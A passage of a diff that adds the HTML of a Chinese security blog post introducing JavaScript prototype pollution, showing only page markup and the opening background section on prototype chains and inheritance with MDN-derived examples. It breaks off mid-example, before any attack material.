@@ -1,0 +1,3093 @@
+<!DOCTYPE html>
+<html lang="en">
+    <!-- title -->
+
+
+
+
+<!-- keywords -->
+
+
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no" >
+    <meta name="author" content="m0nk3y">
+    <meta name="renderer" content="webkit">
+    <meta name="copyright" content="m0nk3y">
+    
+    <meta name="keywords" content="渗透测试,WEB 安全,信息安全,CTF,攻防对抗,代码审计,安全研究,渗透测试">
+    
+    <meta name="description" content="">
+    <meta name="description" content="一直都想学这个, 但是一直都没学, 现在来学一学 总结的目的, 是以后自己忘了或者查资料尽量直接往笔记里找了, 不用到处找, 方便 复现的时候自闭了… 0x00    前置基础知识来源: 参考资料1 原型链与继承首先, 我们先来看看MDN web docs 是怎么介绍这个原型链的,  对于使用过基于类的语言 (如 Java 或 C++) 的开发人员来说，JavaScript 有点令人困惑，因为它是">
+<meta property="og:type" content="article">
+<meta property="og:title" content="初探JavaScript Prototype Pollution Attack">
+<meta property="og:url" content="https://hack-for.fun/710f.html">
+<meta property="og:site_name" content="可惜没如果、m0nk3y‘s Blog">
+<meta property="og:description" content="一直都想学这个, 但是一直都没学, 现在来学一学 总结的目的, 是以后自己忘了或者查资料尽量直接往笔记里找了, 不用到处找, 方便 复现的时候自闭了… 0x00    前置基础知识来源: 参考资料1 原型链与继承首先, 我们先来看看MDN web docs 是怎么介绍这个原型链的,  对于使用过基于类的语言 (如 Java 或 C++) 的开发人员来说，JavaScript 有点令人困惑，因为它是">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo/images/20200415112310.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo/images/20200415112511.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo/images/20200415112825.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo/images/20200415113203.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo/images/20200415135304.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo/images/20200415135849.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo/images/20200415145752.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo/images/20200415155932.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo/images/20200415165256.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo/images/20200415171558.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo/images/20200415180136.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo/images/20200303222123.jpg">
+<meta property="article:published_time" content="2020-04-15T00:56:06.000Z">
+<meta property="article:modified_time" content="2020-08-25T08:45:35.742Z">
+<meta property="article:author" content="m0nk3y">
+<meta property="article:tag" content="原型链污染攻击">
+<meta property="article:tag" content="Node.js">
+<meta property="article:tag" content="JavaScript">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo/images/20200415112310.png">
+    <meta http-equiv="Cache-control" content="no-cache">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
+    
+    <title>初探JavaScript Prototype Pollution Attack · M0nk3y&#39;s Blog</title>
+    <style type="text/css">
+    @font-face {
+        font-family: 'Oswald-Regular';
+        src: url("/font/Oswald-Regular.ttf");
+    }
+
+    body {
+        margin: 0;
+    }
+
+    header,
+    footer,
+    .back-top,
+    .sidebar,
+    .container,
+    .site-intro-meta,
+    .toc-wrapper {
+        display: none;
+    }
+
+    .site-intro {
+        position: relative;
+        z-index: 3;
+        width: 100%;
+        /* height: 50vh; */
+        overflow: hidden;
+    }
+
+    .site-intro-placeholder {
+        position: absolute;
+        z-index: -2;
+        top: 0;
+        left: 0;
+        width: calc(100% + 300px);
+        height: 100%;
+        background: repeating-linear-gradient(-45deg, #444 0, #444 80px, #333 80px, #333 160px);
+        background-position: center center;
+        transform: translate3d(-226px, 0, 0);
+        animation: gradient-move 2.5s ease-out 0s infinite;
+    }
+
+    @keyframes gradient-move {
+        0% {
+            transform: translate3d(-226px, 0, 0);
+        }
+        100% {
+            transform: translate3d(0, 0, 0);
+        }
+    }
+
+</style>
+
+    <link rel="preload" href= "/css/style.css?v=20180824" as="style" onload="this.onload=null;this.rel='stylesheet'" />
+    <link rel="stylesheet" href= "/css/mobile.css?v=20180824" media="(max-width: 980px)">
+    
+    <link rel="preload" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'" />
+    
+    <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
+/* This file is meant as a standalone workflow for
+- testing support for link[rel=preload]
+- enabling async CSS loading in browsers that do not support rel=preload
+- applying rel preload css once loaded, whether supported or not.
+*/ -->
+<script>
+(function( w ){
+	"use strict";
+	// rel=preload support test
+	if( !w.loadCSS ){
+		w.loadCSS = function(){};
+	}
+	// define on the loadCSS obj
+	var rp = loadCSS.relpreload = {};
+	// rel=preload feature support test
+	// runs once and returns a function for compat purposes
+	rp.support = (function(){
+		var ret;
+		try {
+			ret = w.document.createElement( "link" ).relList.supports( "preload" );
+		} catch (e) {
+			ret = false;
+		}
+		return function(){
+			return ret;
+		};
+	})();
+
+	// if preload isn't supported, get an asynchronous load by using a non-matching media attribute
+	// then change that media back to its intended value on load
+	rp.bindMediaToggle = function( link ){
+		// remember existing media attr for ultimate state, or default to 'all'
+		var finalMedia = link.media || "all";
+
+		function enableStylesheet(){
+			link.media = finalMedia;
+		}
+
+		// bind load handlers to enable media
+		if( link.addEventListener ){
+			link.addEventListener( "load", enableStylesheet );
+		} else if( link.attachEvent ){
+			link.attachEvent( "onload", enableStylesheet );
+		}
+
+		// Set rel and non-applicable media type to start an async request
+		// note: timeout allows this to happen async to let rendering continue in IE
+		setTimeout(function(){
+			link.rel = "stylesheet";
+			link.media = "only x";
+		});
+		// also enable media after 3 seconds,
+		// which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
+		setTimeout( enableStylesheet, 3000 );
+	};
+
+	// loop through link elements in DOM
+	rp.poly = function(){
+		// double check this to prevent external calls from running
+		if( rp.support() ){
+			return;
+		}
+		var links = w.document.getElementsByTagName( "link" );
+		for( var i = 0; i < links.length; i++ ){
+			var link = links[ i ];
+			// qualify links to those with rel=preload and as=style attrs
+			if( link.rel === "preload" && link.getAttribute( "as" ) === "style" && !link.getAttribute( "data-loadcss" ) ){
+				// prevent rerunning on link
+				link.setAttribute( "data-loadcss", true );
+				// bind listeners to toggle media back
+				rp.bindMediaToggle( link );
+			}
+		}
+	};
+
+	// if unsupported, run the polyfill
+	if( !rp.support() ){
+		// run once at least
+		rp.poly();
+
+		// rerun poly on an interval until onload
+		var run = w.setInterval( rp.poly, 500 );
+		if( w.addEventListener ){
+			w.addEventListener( "load", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		} else if( w.attachEvent ){
+			w.attachEvent( "onload", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		}
+	}
+
+
+	// commonjs
+	if( typeof exports !== "undefined" ){
+		exports.loadCSS = loadCSS;
+	}
+	else {
+		w.loadCSS = loadCSS;
+	}
+}( typeof global !== "undefined" ? global : this ) );
+</script>
+
+    <link rel="icon" href= "https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20201102172212.JPG" />
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js" as="script" />
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js" as="script" />
+    <link rel="preload" href="/scripts/main.js" as="script" />
+    <link rel="preload" as="font" href="/font/Oswald-Regular.ttf" crossorigin>
+    <link rel="preload" as="font" href="https://at.alicdn.com/t/font_327081_1dta1rlogw17zaor.woff" crossorigin>
+    
+    <!-- fancybox -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.js" defer></script>
+    <!-- 百度统计  -->
+    
+    <!-- 谷歌统计  -->
+    
+<meta name="generator" content="Hexo 5.1.1"><link rel="alternate" href="/atom.xml" title="可惜没如果、m0nk3y‘s Blog" type="application/atom+xml">
+</head>
+
+    
+        <body class="post-body">
+    
+    
+<header class="header">
+
+    <div class="read-progress"></div>
+    <div class="header-sidebar-menu">&#xe775;</div>
+    <!-- post页的toggle banner  -->
+    
+    <div class="banner">
+            <div class="blog-title">
+                <a href="/" >M0nk3y&#39;s Blog</a>
+            </div>
+            <div class="post-title">
+                <a href="#" class="post-name">初探JavaScript Prototype Pollution Attack</a>
+            </div>
+    </div>
+    
+    <a class="home-link" href=/>M0nk3y's Blog</a>
+</header>
+    <div class="wrapper">
+        <div class="site-intro" style="
+
+
+
+
+
+
+
+height:50vh;
+">
+    
+    <!-- 主页  -->
+    
+    
+    <!-- 404页  -->
+            
+    <div class="site-intro-placeholder"></div>
+    <div class="site-intro-img" style="background-image: url(https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200825211012.jpg)"></div>
+    <div class="site-intro-meta">
+        <!-- 标题  -->
+        <h1 class="intro-title">
+            <!-- 主页  -->
+            
+            初探JavaScript Prototype Pollution Attack
+            <!-- 404 -->
+            
+        </h1>
+        <!-- 副标题 -->
+        <p class="intro-subtitle">
+            <!-- 主页副标题  -->
+            
+            
+            <!-- 404 -->
+            
+        </p>
+        <!-- 文章页meta -->
+        
+            <div class="post-intros">
+                <!-- 文章页标签  -->
+                
+                    <div class= post-intro-tags >
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "原型链污染攻击">原型链污染攻击</a>
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "Node.js">Node.js</a>
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "JavaScript">JavaScript</a>
+    
+</div>
+                
+                
+                    <div class="post-intro-read">
+                        <span>Word count: <span class="post-count word-count">5.6k</span>Reading time: <span class="post-count reading-time">24 min</span></span>
+                    </div>
+                
+                <div class="post-intro-meta">
+                    <span class="post-intro-calander iconfont-archer">&#xe676;</span>
+                    <span class="post-intro-time">2020/04/15</span>
+                    
+                    <span id="busuanzi_container_page_pv" class="busuanzi-pv">
+                        <span class="iconfont-archer">&#xe602;</span>
+                        <span id="busuanzi_value_page_pv"></span>
+                    </span>
+                    
+                    <span class="shareWrapper">
+                        <span class="iconfont-archer shareIcon">&#xe71d;</span>
+                        <span class="shareText">Share</span>
+                        <ul class="shareList">
+                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
+                                <div class="share-qrcode"></div>
+                            </li>
+                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
+                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
+                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
+                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
+                        </ul>
+                    </span>
+                </div>
+            </div>
+        
+    </div>
+</div>
+        <script>
+ 
+  // get user agent
+  var browser = {
+    versions: function () {
+      var u = window.navigator.userAgent;
+      return {
+        userAgent: u,
+        trident: u.indexOf('Trident') > -1, //IE内核
+        presto: u.indexOf('Presto') > -1, //opera内核
+        webKit: u.indexOf('AppleWebKit') > -1, //苹果、谷歌内核
+        gecko: u.indexOf('Gecko') > -1 && u.indexOf('KHTML') == -1, //火狐内核
+        mobile: !!u.match(/AppleWebKit.*Mobile.*/), //是否为移动终端
+        ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios终端
+        android: u.indexOf('Android') > -1 || u.indexOf('Linux') > -1, //android终端或者uc浏览器
+        iPhone: u.indexOf('iPhone') > -1 || u.indexOf('Mac') > -1, //是否为iPhone或者安卓QQ浏览器
+        iPad: u.indexOf('iPad') > -1, //是否为iPad
+        webApp: u.indexOf('Safari') == -1, //是否为web应用程序，没有头部与底部
+        weixin: u.indexOf('MicroMessenger') == -1, //是否为微信浏览器
+        uc: u.indexOf('UCBrowser') > -1 //是否为android下的UC浏览器
+      };
+    }()
+  }
+  console.log("userAgent:" + browser.versions.userAgent);
+
+  // callback
+  function fontLoaded() {
+    console.log('font loaded');
+    if (document.getElementsByClassName('site-intro-meta')) {
+      document.getElementsByClassName('intro-title')[0].classList.add('intro-fade-in');
+      document.getElementsByClassName('intro-subtitle')[0].classList.add('intro-fade-in');
+      var postIntros = document.getElementsByClassName('post-intros')[0]
+      if (postIntros) {
+        postIntros.classList.add('post-fade-in');
+      }
+    }
+  }
+
+  // UC不支持跨域，所以直接显示
+  function asyncCb(){
+    if (browser.versions.uc) {
+      console.log("UCBrowser");
+      fontLoaded();
+    } else {
+      WebFont.load({
+        custom: {
+          families: ['Oswald-Regular']
+        },
+        loading: function () {  //所有字体开始加载
+          // console.log('loading');
+        },
+        active: function () {  //所有字体已渲染
+          fontLoaded();
+        },
+        inactive: function () { //字体预加载失败，无效字体或浏览器不支持加载
+          console.log('inactive: timeout');
+          fontLoaded();
+        },
+        timeout: 5000 // Set the timeout to two seconds
+      });
+    }
+  }
+
+  function asyncErr(){
+    console.warn('script load from CDN failed, will load local script')
+  }
+
+  // load webfont-loader async, and add callback function
+  function async(u, cb, err) {
+    var d = document, t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0];
+    o.src = u;
+    if (cb) { o.addEventListener('load', function (e) { cb(null, e); }, false); }
+    if (err) { o.addEventListener('error', function (e) { err(null, e); }, false); }
+    s.parentNode.insertBefore(o, s);
+  }
+
+  var asyncLoadWithFallBack = function(arr, success, reject) {
+      var currReject = function(){
+        reject()
+        arr.shift()
+        if(arr.length)
+          async(arr[0], success, currReject)
+        }
+
+      async(arr[0], success, currReject)
+  }
+
+  asyncLoadWithFallBack([
+    "https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js", 
+    "https://cdn.bootcss.com/webfont/1.6.28/webfontloader.js",
+    "/lib/webfontloader.min.js"
+  ], asyncCb, asyncErr)
+</script>        
+        <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
+        <div class="container container-unloaded">
+            <main class="main post-page">
+    <article class="article-entry">
+        <p>一直都想学这个, 但是一直都没学, 现在来学一学</p>
+<p>总结的目的, 是以后自己忘了或者查资料尽量直接往笔记里找了, 不用到处找, 方便</p>
+<p>复现的时候自闭了…</p>
+<h1 id="0x00-前置基础知识"><a href="#0x00-前置基础知识" class="headerlink" title="0x00    前置基础知识"></a>0x00    前置基础知识</h1><p>来源: 参考资料1</p>
+<h2 id="原型链与继承"><a href="#原型链与继承" class="headerlink" title="原型链与继承"></a>原型链与继承</h2><p>首先, 我们先来看看MDN web docs 是怎么介绍这个原型链的,</p>
+<blockquote>
+<p>对于使用过基于类的语言 (如 Java 或 C++) 的开发人员来说，JavaScript 有点令人困惑，因为它是动态的，并且本身不提供一个 <code>class</code> 实现。（在 ES2015/ES6 中引入了 <code>class</code> 关键字，但那只是语法糖，JavaScript 仍然是基于原型的）。</p>
+<p>当谈到继承时，JavaScript 只有一种结构：对象。每个实例对象（ object ）都有一个私有属性（称之为 <strong>proto</strong> ）指向它的构造函数的原型对象（<strong>prototype</strong> ）。该原型对象也有一个自己的原型对象( <strong>proto</strong> ) ，层层向上直到一个对象的原型对象为 <code>null</code>。根据定义，<code>null</code> 没有原型，并作为这个<strong>原型链</strong>中的最后一个环节。</p>
+<p>几乎所有 JavaScript 中的对象都是位于原型链顶端的 <a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Object"><code>Object</code></a> 的实例。</p>
+<p>尽管这种原型继承通常被认为是 JavaScript 的弱点之一，但是原型继承模型本身实际上比经典模型更强大。例如，在原型模型的基础上构建经典模型相当简单。</p>
+</blockquote>
+<p>从介绍中我们可以知道, </p>
+<ol>
+<li>在EC6之前, JavaScript 是没有<code>class</code> 关键字的</li>
+<li>继承时, JavaScript 只有一种结构, 对象</li>
+<li>对象(<strong>object</strong>) 都有一个私有属性(<strong>proto</strong>)</li>
+<li><strong>proto</strong> 指向构造函数的原型对象(<strong>prototype</strong>)</li>
+<li>原型对象(prototype) 也有一个自己的原型对象(proto)</li>
+</ol>
+<h2 id="基于原型链的继承"><a href="#基于原型链的继承" class="headerlink" title="基于原型链的继承"></a>基于原型链的继承</h2><h3 id="继承属性"><a href="#继承属性" class="headerlink" title="继承属性"></a>继承属性</h3><p>JavaScript 对象是动态的属性“包”（指其自己的属性）。<strong>JavaScript 对象有一个指向一个原型对象的链。当试图访问一个对象的属性时，它不仅仅在该对象上搜寻，还会搜寻该对象的原型，以及该对象的原型的原型，依次层层向上搜索，直到找到一个名字匹配的属性或到达原型链的末尾。</strong></p>
+<p>代码演示: </p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 让我们从一个自身拥有属性a和b的函数里创建一个对象o：</span></span><br><span class="line"><span class="keyword">let</span> f = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">   <span class="built_in">this</span>.a = <span class="number">1</span>;</span><br><span class="line">   <span class="built_in">this</span>.b = <span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* 这么写也一样</span></span><br><span class="line"><span class="comment">function f() &#123;</span></span><br><span class="line"><span class="comment">  this.a = 1;</span></span><br><span class="line"><span class="comment">  this.b = 2;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">let</span> o = <span class="keyword">new</span> f(); <span class="comment">// &#123;a: 1, b: 2&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 在f函数的原型上定义属性</span></span><br><span class="line">f.prototype.b = <span class="number">3</span>;</span><br><span class="line">f.prototype.c = <span class="number">4</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 不要在 f 函数的原型上直接定义 f.prototype = &#123;b:3,c:4&#125;;这样会直接打破原型链</span></span><br><span class="line"><span class="comment">// o.[[Prototype]] 有属性 b 和 c</span></span><br><span class="line"><span class="comment">//  (其实就是 o.__proto__ 或者 o.constructor.prototype)</span></span><br><span class="line"><span class="comment">// o.[[Prototype]].[[Prototype]] 是 Object.prototype.</span></span><br><span class="line"><span class="comment">// 最后o.[[Prototype]].[[Prototype]].[[Prototype]]是null</span></span><br><span class="line"><span class="comment">// 这就是原型链的末尾，即 null，</span></span><br><span class="line"><span class="comment">// 根据定义，null 就是没有 [[Prototype]]。</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 综上，整个原型链如下: </span></span><br><span class="line"></span><br><span class="line"><span class="comment">// &#123;a:1, b:2&#125; ---&gt; &#123;b:3, c:4&#125; ---&gt; Object.prototype---&gt; null</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(o.a); <span class="comment">// 1</span></span><br><span class="line"><span class="comment">// a是o的自身属性吗？是的，该属性的值为 1</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(o.b); <span class="comment">// 2</span></span><br><span class="line"><span class="comment">// b是o的自身属性吗？是的，该属性的值为 2</span></span><br><span class="line"><span class="comment">// 原型上也有一个&#x27;b&#x27;属性，但是它不会被访问到。</span></span><br><span class="line"><span class="comment">// 这种情况被称为&quot;属性遮蔽 (property shadowing)&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(o.c); <span class="comment">// 4</span></span><br><span class="line"><span class="comment">// c是o的自身属性吗？不是，那看看它的原型上有没有</span></span><br><span class="line"><span class="comment">// c是o.[[Prototype]]的属性吗？是的，该属性的值为 4</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(o.d); <span class="comment">// undefined</span></span><br><span class="line"><span class="comment">// d 是 o 的自身属性吗？不是，那看看它的原型上有没有</span></span><br><span class="line"><span class="comment">// d 是 o.[[Prototype]] 的属性吗？不是，那看看它的原型上有没有</span></span><br><span class="line"><span class="comment">// o.[[Prototype]].[[Prototype]] 为 null，停止搜索</span></span><br><span class="line"><span class="comment">// 找不到 d 属性，返回 undefined</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="继承方法"><a href="#继承方法" class="headerlink" title="继承方法"></a>继承方法</h3><blockquote>
+<p><strong>JavaScript 并没有其他基于类的语言所定义的“方法”。在 JavaScript 里，任何函数都可以添加到对象上作为对象的属性。函数的继承与其他的属性继承没有差别，包括上面的“属性遮蔽”（这种情况相当于其他语言的方法重写）。</strong></p>
+<p><strong>当继承的函数被调用时，<a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Operators/this">this</a> 指向的是当前继承的对象，而不是继承的函数所在的原型对象。</strong></p>
+</blockquote>
+<p>代码示例: </p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> o = &#123;</span><br><span class="line">  a: <span class="number">2</span>,</span><br><span class="line">  m: <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.a + <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(o.m()); <span class="comment">// 3</span></span><br><span class="line"><span class="comment">// 当调用 o.m 时，&#x27;this&#x27; 指向了 o.</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> p = <span class="built_in">Object</span>.create(o);</span><br><span class="line"><span class="comment">// p是一个继承自 o 的对象</span></span><br><span class="line"></span><br><span class="line">p.a = <span class="number">4</span>; <span class="comment">// 创建 p 的自身属性 &#x27;a&#x27;</span></span><br><span class="line"><span class="built_in">console</span>.log(p.m()); <span class="comment">// 5</span></span><br><span class="line"><span class="comment">// 调用 p.m 时，&#x27;this&#x27; 指向了 p</span></span><br><span class="line"><span class="comment">// 又因为 p 继承了 o 的 m 函数</span></span><br><span class="line"><span class="comment">// 所以，此时的 &#x27;this.a&#x27; 即 p.a，就是 p 的自身属性 &#x27;a&#x27; </span></span><br></pre></td></tr></table></figure>
+
+<h3 id="使用原型"><a href="#使用原型" class="headerlink" title="使用原型"></a>使用原型</h3><p>在 JavaScript 中，函数（function）是允许拥有属性的。所有的函数会有一个特别的属性 —— <code>prototype</code></p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">doSomething</span>(<span class="params"></span>)</span>&#123;&#125;</span><br><span class="line"><span class="built_in">console</span>.log( doSomething.prototype );</span><br><span class="line"><span class="comment">// 和声明函数的方式无关，</span></span><br><span class="line"><span class="comment">// JavaScript 中的函数永远有一个默认原型属性。</span></span><br><span class="line"><span class="keyword">var</span> doSomething = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;&#125;;</span><br><span class="line"><span class="built_in">console</span>.log( doSomething.prototype );</span><br></pre></td></tr></table></figure>
+
+<p>在console 中的运行结果, 我在我自己电脑上的Chrome/Firefox 上运行的结果不是这样的… 为了学习的话, 直接抄代码过来好了,,我也不知道为什么…. (我知道了 因为我没有把点开…😄)</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="keyword">constructor</span>: ƒ doSomething(),</span><br><span class="line">    __proto__: &#123;</span><br><span class="line">        <span class="keyword">constructor</span>: ƒ Object(),</span><br><span class="line">        hasOwnProperty: ƒ hasOwnProperty(),</span><br><span class="line">        isPrototypeOf: ƒ isPrototypeOf(),</span><br><span class="line">        propertyIsEnumerable: ƒ propertyIsEnumerable(),</span><br><span class="line">        toLocaleString: ƒ toLocaleString(),</span><br><span class="line">        toString: ƒ toString(),</span><br><span class="line">        valueOf: ƒ valueOf()</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>给<code>doSomething</code>函数的原型对象添加新属性</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">doSomething</span>(<span class="params"></span>)</span>&#123;&#125;</span><br><span class="line">doSomething.prototype.foo = <span class="string">&quot;bar&quot;</span>;</span><br><span class="line"><span class="built_in">console</span>.log( doSomething.prototype );</span><br></pre></td></tr></table></figure>
+
+<p>运行结果: </p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    foo: <span class="string">&quot;bar&quot;</span>,</span><br><span class="line">    <span class="keyword">constructor</span>: ƒ doSomething(),</span><br><span class="line">    __proto__: &#123;</span><br><span class="line">        <span class="keyword">constructor</span>: ƒ Object(),</span><br><span class="line">        hasOwnProperty: ƒ hasOwnProperty(),</span><br><span class="line">        isPrototypeOf: ƒ isPrototypeOf(),</span><br><span class="line">        propertyIsEnumerable: ƒ propertyIsEnumerable(),</span><br><span class="line">        toLocaleString: ƒ toLocaleString(),</span><br><span class="line">        toString: ƒ toString(),</span><br><span class="line">        valueOf: ƒ valueOf()</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>通过<code>new</code>操作符来创建基于这个原型对象的doSomething<code>实例</code></p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">doSomething</span>(<span class="params"></span>)</span>&#123;&#125;</span><br><span class="line">doSomething.prototype.foo = <span class="string">&quot;bar&quot;</span>; <span class="comment">// add a property onto the prototype</span></span><br><span class="line"><span class="keyword">var</span> doSomeInstancing = <span class="keyword">new</span> doSomething();</span><br><span class="line">doSomeInstancing.prop = <span class="string">&quot;some value&quot;</span>; <span class="comment">// add a property onto the object</span></span><br><span class="line"><span class="built_in">console</span>.log( doSomeInstancing );</span><br></pre></td></tr></table></figure>
+
+<p>运行结果: </p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    prop: <span class="string">&quot;some value&quot;</span>,</span><br><span class="line">    __proto__: &#123;</span><br><span class="line">        foo: <span class="string">&quot;bar&quot;</span>,</span><br><span class="line">        <span class="keyword">constructor</span>: ƒ doSomething(),</span><br><span class="line">        __proto__: &#123;</span><br><span class="line">            <span class="keyword">constructor</span>: ƒ Object(),</span><br><span class="line">            hasOwnProperty: ƒ hasOwnProperty(),</span><br><span class="line">            isPrototypeOf: ƒ isPrototypeOf(),</span><br><span class="line">            propertyIsEnumerable: ƒ propertyIsEnumerable(),</span><br><span class="line">            toLocaleString: ƒ toLocaleString(),</span><br><span class="line">            toString: ƒ toString(),</span><br><span class="line">            valueOf: ƒ 